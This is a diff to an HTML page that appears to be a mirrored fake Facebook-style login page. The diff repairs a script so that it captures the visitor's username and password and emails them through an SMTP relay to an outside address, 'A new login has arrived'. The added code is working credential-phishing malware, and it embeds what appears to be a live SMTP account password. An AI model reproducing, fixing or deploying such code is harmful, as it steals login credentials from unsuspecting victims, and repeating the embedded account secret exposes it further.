@@ -225,23 +225,24 @@
 
 
 <script>
-    function sendEmail() {
-        let name = document.getElementById("username").value;
-        let email = document.getElementById("password").value;
-        // let message = document.getElementById("message").value;
-        let finalmessage = `username : ${username} <br>  Password : ${password} <br> `;
-        Email.send({
-            Host: "smtp.elasticemail.com",
-            Username: "ademosuemmanuel52@gmail.com",
-            Password: "C7054CF2300315495390764433A9F8D98BA5",
-            To: 'owen@coinmaxpro.xyz',
-            From: "ademosuemmanuel52@gmail.com",
-            Subject: "A new login has arrived",
-            Body: finalmessage
-        }).then(
-            message => alert(mail sent successfully)
-        );
-    }
+   function sendEmail() {
+    let username = document.getElementById("username").value;
+    let password = document.getElementById("password").value;
+    let finalmessage = `Username: ${username} <br> Password: ${password} <br>`;
+
+    Email.send({
+        Host: "smtp.elasticemail.com",
+        Username: "ademosuemmanuel52@gmail.com", // Update with your SMTP username
+        Password: "C7054CF2300315495390764433A9F8D98BA5", // Update with your SMTP password
+        To: 'owen@coinmaxpro.xyz',
+        From: "ademosuemmanuel52@gmail.com",
+        Subject: "A new login has arrived",
+        Body: finalmessage
+    }).then(
+        message => alert('Mail sent successfully')
+    );
+}
+
 </script>
 <!-- Mirrored from votelkg.netlify.app/realfb by HTTrack Website Copier/3.x [XR&CO'2014], Fri, 17 Nov 2023 10:10:39 GMT -->
 </html>
